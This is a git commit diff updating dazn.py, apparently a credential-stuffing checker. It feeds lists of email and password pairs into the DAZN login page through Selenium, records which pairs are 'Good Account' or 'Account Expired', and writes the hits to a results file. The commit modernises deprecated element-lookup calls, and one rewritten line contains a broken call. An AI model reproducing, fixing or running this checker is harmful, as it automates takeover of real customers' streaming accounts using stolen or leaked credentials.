6ff3b899265d6e19037186a3b51aa3a4ddcff4e6
g3th <theinkandpen@yahoo.co.uk>
2023-01-13 23:18:22 +0000

    fixed deprecated method, dazn 	modified:   dazn.py

--- dazn.py
+++ dazn.py
@@ -4,6 +4,7 @@ import requests
 from bs4 import BeautifulSoup as soup
 from headers.dazn_header import header
 from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
+from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
@@ -14,7 +15,7 @@ users = []
 passwords = []
 browser_options = Options()
 browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
-browser_options.headless = True
+browser_options.headless = False
 os.makedirs('accounts',exist_ok=True)
 
 with open(file_directory, 'r') as dazn:
@@ -31,24 +32,24 @@ while index != len(users):
 			browser.set_window_size(500,700)
 			browser.get(page)
 			time.sleep(4)			
-			if browser.find_elements_by_xpath('//*[@id="onetrust-accept-btn-handler"]'):
-				gdpr_accet_all_button = browser.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]')
+			if browser.find_elements(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]'):
+				gdpr_accet_all_button = browser.find_element(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]')
 				gdpr_accet_all_button.click()
 				time.sleep(1)
-			if browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
-				geolocked_content_message = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]').text
+			if browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
+				geolocked_content_message = browser.find_element_By.xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]').text
 				print('\n\nIP: {} | Location: {} '.format(connection_error()[0], connection_error()[1]))
 				print('Country not supported, please use a supported location/IP address.\nEnding.\n')
 				exit()
-			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
-			password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
-			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/main/form/button')
+			email_input_box = browser.find_element(By.XPATH,'//*[@id="email"]')
+			password_input_box = browser.find_element(By.XPATH,'//*[@id="password"]')
+			sign_in_button = browser.find_element(By.XPATH,'//*[@id="root"]/div[1]/main/form/button')
 			email_input_box.send_keys(users[index])
 			password_input_box.send_keys(passwords[index])
 			sign_in_button.click()
 			time.sleep(7)				
-			if browser.find_elements_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
-				error = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
+			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
+				error = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
 				if 'Your email address and/or password are incorrect' in str(error):
 					print(" | {}:{} ---> Credentials don't exist".format(users[index],passwords[index]))
 				
@@ -56,8 +57,8 @@ while index != len(users):
 					print(' | {}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
 					account_results.write('{}:{} ---> Good Account, geo-locked login'.format(users[index],passwords[index]))
 					
-			elif browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
-				expired_account_text = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
+			elif browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
+				expired_account_text = browser.find_element(By.XPATH,'//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
 				if 'Welcome back.' in expired_account_text:
 					print(' | {}:{} ---> Account Expired'.format(users[index],passwords[index]))
 					
